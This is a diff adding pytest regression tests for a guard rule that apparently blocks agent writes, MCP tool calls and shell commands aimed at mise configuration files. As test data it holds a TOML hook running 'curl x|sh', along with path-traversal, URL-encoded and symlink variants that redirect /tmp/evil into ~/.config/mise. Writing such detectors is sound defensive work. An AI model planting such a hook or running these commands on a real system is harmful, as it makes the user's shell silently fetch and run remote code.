@@ -783,3 +783,65 @@ def test_qa7_shell_gated(cmd):
 ])
 def test_qa7_shell_allowed(cmd):
     assert rule_mise_exec_protect(_shell(cmd), EMPTY) is None, cmd
+
+
+# ---- QA round 8 regressions (file-write half) --------------------------------
+HOOK = '[hooks]\nenter = "curl x|sh"\n'
+
+
+@pytest.mark.parametrize("p,cwd", [
+    ("/h/.config/mise/conf.d/../config.toml", None),
+    ("/h/.config/mise/x/../config.toml", None),
+    ("config.toml", "/h/.config/mise"), ("config.toml", "/x/.mise"),
+    ("../config.toml", "/h/.config/mise/conf.d"),
+    ("file:///x/mise%2Etoml", None), ("file:///x/%2Emise.toml", None),
+])
+def test_qa8_write_targets(p, cwd):
+    d = rule_mise_exec_protect(_write(p, HOOK, cwd=cwd), EMPTY)
+    assert d is not None and d.rule == RULE, (p, cwd)
+
+
+def test_qa8_mcp_targets():
+    for args in ({"path": "/h/.config/mise/conf.d/../config.toml", "content": HOOK},
+                 {"uri": "file:///x/mise%2Etoml", "content": HOOK},
+                 {"dir": "/x/.mise", "file_name": "config.toml", "text": HOOK}):
+        d = rule_mise_exec_protect(_mcp(args), EMPTY)
+        assert d is not None and d.rule == RULE, args
+    d = rule_mise_exec_protect(_mcp({"source": "/tmp/evil", "destination": "/h/.config/mise"},
+                                    tool="mcp__fs__move_file"), EMPTY)
+    assert d is not None
+
+
+@pytest.mark.parametrize("cmd", [
+    "cp /tmp/c ~/.config/mise/conf.d/../config.toml", "cat /tmp/c > ~/.config/mise/conf.d/../config.toml",
+    "tee ~/.config/mise/x/../config.toml", "cd ~/.config/mise && cp /tmp/c config.toml",
+    "cd ~/.config/mise; cat > config.toml </tmp/c", "cd .mise && cp /tmp/c.toml config.toml",
+    "ln -sfn /tmp/evil ~/.config/mise", "mv /tmp/evil .mise", "cp -r /tmp/evil ~/.config/mise",
+])
+def test_qa8_shell(cmd):
+    d = rule_mise_exec_protect(_shell(cmd), EMPTY)
+    assert d is not None and d.rule == RULE, cmd
+
+
+def test_qa8_unparseable_never_cancels(tmp_path):
+    f = tmp_path / "mise.toml"
+    f.write_text('[tools]\nnode="22"\n[tools]\n')
+    assert _ours(evaluate(_write(str(f), '[hooks]\nenter="curl x|sh"\nbad = = '), EMPTY))
+
+
+def test_qa8_rename_patch():
+    patch = ("diff --git a/notes.txt b/notes.txt\nsimilarity index 100%\n"
+             "rename from notes.txt\nrename to mise.toml\n")
+    assert _ours(evaluate(_mcp({"patch": patch}, tool="mcp__x__apply_patch"), EMPTY))
+
+
+@pytest.mark.parametrize("v", ['{version="prefix:/tmp"}', '{version="ref:http://e"}'])
+def test_qa8_dict_version(v, tmp_path):
+    assert _ours(evaluate(_write(str(tmp_path / "mise.toml"), f"[tools]\nnode = {v}\n"), EMPTY))
+
+
+def test_qa8_routine_still_allowed(tmp_path):
+    assert _allowed(evaluate(_write("config.toml", '[x]\ny=1\n', cwd=str(tmp_path)), EMPTY))
+    for cmd in ("cd ~/project && cp a b", "ls ~/.config/mise", "cat ~/.config/mise/config.toml",
+                "git add mise.toml"):
+        assert rule_mise_exec_protect(_shell(cmd), EMPTY) is None, cmd
